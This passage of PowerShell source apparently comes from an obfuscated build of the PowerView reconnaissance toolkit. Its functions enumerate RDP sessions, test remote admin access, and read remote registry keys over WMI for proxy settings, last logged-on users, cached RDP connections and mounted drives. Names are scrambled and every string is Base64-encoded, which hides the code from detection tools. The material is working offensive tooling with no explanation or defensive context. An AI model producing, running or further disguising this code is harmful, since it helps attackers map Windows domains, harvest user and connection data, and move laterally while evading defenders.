                        ${___/====\/\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) ${/==\__/=\_/\_/\__}.State
                        ${___/==\_/=\__/=\_} = [IntPtr]::Zero
                        ${_/\_/=\_/=\___/\_} = 0
                        ${__/======\___/\/\} = ${___/\/\/\_/\_/\_/}::WTSQuerySessionInformation(${_/==\/=\__/=\_/==}, ${/==\__/=\_/\_/\__}.SessionID, 14, [ref]${___/==\_/=\__/=\_}, [ref]${_/\_/=\_/=\___/\_});${____/=\_/==\/\__/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${__/======\___/\/\} -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${____/=\_/==\/\__/}).Message)"
                        }
                        else {
                            ${_/=\/===\___/=\_/} = ${___/==\_/=\__/=\_}.ToInt64()
                            ${/=\_/\/====\/\___} = New-Object System.Intptr -ArgumentList ${_/=\/===\___/=\_/}
                            ${_/\__/=\___/=\/\_} = ${/=\_/\/====\/\___} -as ${_____/\/===\/\_/\}
                            ${/==\__/==\/====\_} = ${_/\__/=\___/=\/\_}.Address
                            if (${/==\__/==\/====\_}[2] -ne 0) {
                                ${/==\__/==\/====\_} = [String]${/==\__/==\/====\_}[2]+'.'+[String]${/==\__/==\/====\_}[3]+'.'+[String]${/==\__/==\/====\_}[4]+'.'+[String]${/==\__/==\/====\_}[5]
                            }
                            else {
                                ${/==\__/==\/====\_} = $Null
                            }
                            ${___/====\/\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) ${/==\__/==\/====\_}
                            ${___/====\/\_/=\/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAEQAUABTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                            ${___/====\/\_/=\/\}
                            $Null = ${___/\/\/\_/\_/\_/}::WTSFreeMemory(${___/==\_/=\__/=\_})
                            ${_/=\/\_/\/=\_____/} += ${__/\/===\_/\/\/=\}
                        }
                    }
                    $Null = ${___/\/\/\_/\_/\_/}::WTSFreeMemoryEx(2, ${/===\_/\__/\_/=\_}, ${__/==\/\/===\__/\})
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${__/\_/==\/===\__/}).Message)"
                }
                $Null = ${___/\/\/\_/\_/\_/}::WTSCloseServer(${_/==\/=\__/=\_/==})
            }
            else {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AFIARABQAFMAZQBzAHMAaQBvAG4AXQAgAEUAcgByAG8AcgAgAG8AcABlAG4AaQBuAGcAIAB0AGgAZQAgAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFMAZQBzAHMAaQBvAG4AIABIAG8AcwB0ACAAKABSAEQAIABTAGUAcwBzAGkAbwBuACAASABvAHMAdAApACAAcwBlAHIAdgBlAHIAIABmAG8AcgA6ACAAJAB7AC8APQBcAC8AXAAvAFwALwA9AFwAXwBfAC8AXABfAC8APQB9AA==')))
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function ________/=\/\_/=== {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${_/==\/=\__/=\_/==} = ${/=\____/===\/=\_/}::OpenSCManagerW($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAvAFwAXwBfAF8AXwBfAF8AXwAvAFwALwBcAC8APQBcAC8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F);${__/\_/==\/===\__/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            ${___/=\/=\_/=\__/\} = New-Object PSObject
            ${___/=\/=\_/=\__/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
            if (${_/==\/=\__/=\_/==} -ne 0) {
                $Null = ${/=\____/===\/=\_/}::CloseServiceHandle(${_/==\/=\__/=\_/==})
                ${___/=\/=\_/=\__/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] ${__/\_/==\/===\__/}).Message)"
                ${___/=\/=\_/=\__/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $False
            }
            ${___/=\/=\_/=\__/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAGQAbQBpAG4AQQBjAGMAZQBzAHMA'))))
            ${___/=\/=\_/=\__/\}
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function _/==\/==\/\/\__/\_ {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            if (${/\_______/\/\/=\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQB7ADEALAAzAH0AJAA=')))) {
                ${__/\/====\___/==\} = ${/\_______/\/\/=\/}
                ${/\_______/\/\/=\/} = [System.Net.Dns]::GetHostByAddress(${/\_______/\/\/=\/}) | select -ExpandProperty HostName
            }
            else {
                ${__/\/====\___/==\} = @(_/=====\___/====== -/=\/\/\/=\__/\_/= ${/\_______/\/\/=\/})[0].IPAddress
            }
            ${/=\_/\/=\/==\/\__} = [IntPtr]::Zero
            ${___/=\/\________/} = ${_/=\___/=\/\/\/==}::DsGetSiteName(${/\_______/\/\/=\/}, [ref]${/=\_/\/=\/==\/\__})
            ${_/==\/=\_/\_/=\_/} = New-Object PSObject
            ${_/==\/=\_/\_/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
            ${_/==\/=\_/\_/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${__/\/====\___/==\}
            if (${___/=\/\________/} -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${/=\_/\/=\/==\/\__})
                ${_/==\/=\_/\_/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] ${___/=\/\________/}).Message)"
                ${_/==\/=\_/\_/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) ''
            }
            ${_/==\/=\_/\_/=\_/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIAUwBpAHQAZQA='))))
            $Null = ${_/=\___/=\/\/\/==}::NetApiBufferFree(${/=\_/\/=\/==\/\__})
            ${_/==\/=\_/\_/=\_/}
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Get-WMIRegProxy {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = ${Env:/=\/\/\/=\__/\_/=},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            try {
                ${__/=\/\__/\______} = @{
                    'List' = $True
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                    'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    'Computername' = ${/\_______/\/\/=\/}
                    'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/\__/\______}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                ${/=\/====\/\/==\/=} = gwmi @__/=\/\__/\______
                ${_/===\____/\_/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzAA==')))
                ${_/=\__/\_/=\_/\/\} = 2147483649
                ${_/===\/\/\/==\___} = ${/=\/====\/\/==\/=}.GetStringValue(${_/=\__/\_/=\_/\/\}, ${_/===\____/\_/\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA==')))).sValue
                ${___/===\/=\__/\/=} = ${/=\/====\/\/==\/=}.GetStringValue(${_/=\__/\_/=\_/\/\}, ${_/===\____/\_/\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA=')))).sValue
                ${/==\/=\_____/\_/=} = ''
                if (${___/===\/=\__/\/=} -and (${___/===\/=\__/\/=} -ne '')) {
                    try {
                        ${/==\/=\_____/\_/=} = (New-Object Net.WebClient).DownloadString(${___/===\/=\__/\/=})
                    }
                    catch {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAYwBvAG4AbgBlAGMAdABpAG4AZwAgAHQAbwAgAEEAdQB0AG8AQwBvAG4AZgBpAGcAVQBSAEwAIAA6ACAAJAB7AF8AXwBfAC8APQA9AD0AXAAvAD0AXABfAF8ALwBcAC8APQB9AA==')))
                    }
                }
                if (${_/===\/\/\/==\___} -or ${___/===\/=\__/\/=}) {
                    ${/==\/===\__/\___/} = New-Object PSObject
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))) ${_/===\/\/\/==\___}
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))) ${___/===\/=\__/\/=}
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBwAGEAZAA='))) ${/==\/=\_____/\_/=}
                    ${/==\/===\__/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwB4AHkAUwBlAHQAdABpAG4AZwBzAA=='))))
                    ${/==\/===\__/\___/}
                }
                else {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAATgBvACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHUAbgBkACAAZgBvAHIAIAAkAHsALwA9AFwALwBcAC8AXAAvAD0AXABfAF8ALwBcAF8ALwA9AH0A')))
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAZQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHIAIAAkAHsALwA9AFwALwBcAC8AXAAvAD0AXABfAF8ALwBcAF8ALwA9AH0AIAA6ACAAJABfAA==')))
            }
        }
    }
}
function Get-WMIRegLastLoggedOn {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${/==\/=====\/\/===} = 2147483650
            ${__/=\/\__/\______} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${/\_______/\/\/=\/}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/\__/\______}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${/===========\/==\} = gwmi @__/=\/\__/\______
                ${_/===\____/\_/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
                ${_____/===\___/\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
                ${/==\/\/=\____/=\_} = ${/===========\/==\}.GetStringValue(${/==\/=====\/\/===}, ${_/===\____/\_/\_/}, ${_____/===\___/\/\}).sValue
                ${/\____/====\_/=\/} = New-Object PSObject
                ${/\____/====\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                ${/\____/====\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4A'))) ${/==\/\/=\____/=\_}
                ${/\____/====\_/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAGEAcwB0AEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByAA=='))))
                ${/\____/====\_/=\/}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEwAYQBzAHQATABvAGcAZwBlAGQATwBuAF0AIABFAHIAcgBvAHIAIABvAHAAZQBuAGkAbgBnACAAcgBlAG0AbwB0AGUAIAByAGUAZwBpAHMAdAByAHkAIABvAG4AIAAkAHsALwBcAF8AXwBfAF8AXwBfAF8ALwBcAC8AXAAvAD0AXAAvAH0ALgAgAFIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbABpAGsAZQBsAHkAIABuAG8AdAAgAGUAbgBhAGIAbABlAGQALgA=')))
            }
        }
    }
}
function Get-WMIRegCachedRDPConnection {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${_/=\__/\/=\_/\/\_} = 2147483651
            ${__/=\/\__/\______} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${/\_______/\/\/=\/}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/\__/\______}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${/===========\/==\} = gwmi @__/=\/\__/\______
                ${/=\___/\__/==\__/} = (${/===========\/==\}.EnumKey(${_/=\__/\/=\_/\/\_}, '')).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${__/==\/\/=\/\/\/=} in ${/=\___/\__/==\__/}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${/=\__/\_/\__/\/\_} = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ ${__/==\/\/=\/\/\/=} -Credential $Credential
                        }
                        else {
                            ${/=\__/\_/\__/\/\_} = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ ${__/==\/\/=\/\/\/=}
                        }
                        ${_/\/\_/\__/=\/=\/} = ${/===========\/==\}.EnumValues(${_/=\__/\/=\_/\/\_},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA=')))).sNames
                        ForEach (${/==\__/\/=====\_/} in ${_/\/\_/\__/=\/=\/}) {
                            if (${/==\__/\/=====\_/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                                ${/==\/==\__/\_/=\_} = ${/===========\/==\}.GetStringValue(${_/=\__/\/=\_/\/\_}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA='))), ${/==\__/\/=====\_/}).sValue
                                ${__/====\/=\/\___/} = New-Object PSObject
                                ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                                ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\__/\_/\__/\/\_}
                                ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${__/==\/\/=\/\/\/=}
                                ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) ${/==\/==\__/\_/=\_}
                                ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                                ${__/====\/=\/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                                ${__/====\/=\/\___/}
                            }
                        }
                        ${_/\/\_/=====\_/\/} = ${/===========\/==\}.EnumKey(${_/=\__/\/=\_/\/\_},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwA=')))).sNames
                        ForEach ($Server in ${_/\/\_/=====\_/\/}) {
                            ${____/==\_/\_/==\/} = ${/===========\/==\}.GetStringValue(${_/=\__/\/=\_/\/\_}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQBcAC8AXAAvAD0AXAAvAFwALwBcAC8APQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwBcACQAUwBlAHIAdgBlAHIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                            ${__/====\/=\/\___/} = New-Object PSObject
                            ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                            ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\__/\_/\__/\/\_}
                            ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${__/==\/\/=\/\/\/=}
                            ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                            ${__/====\/=\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) ${____/==\_/\_/==\/}
                            ${__/====\/=\/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                            ${__/====\/=\/\___/}
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgA6ACAAJABfAA==')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJAB7AC8AXABfAF8AXwBfAF8AXwBfAC8AXAAvAFwALwA9AFwALwB9ACwAIABsAGkAawBlAGwAeQAgAGkAbgBzAHUAZgBmAGkAYwBpAGUAbgB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAbwByACAAZgBpAHIAZQB3AGEAbABsACAAcgB1AGwAZQBzACAAbwBuACAAaABvAHMAdAA6ACAAJABfAA==')))
            }
        }
    }
}
function Get-WMIRegMountedDrive {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${_/=\__/\/=\_/\/\_} = 2147483651
            ${__/=\/\__/\______} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${/\_______/\/\/=\/}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
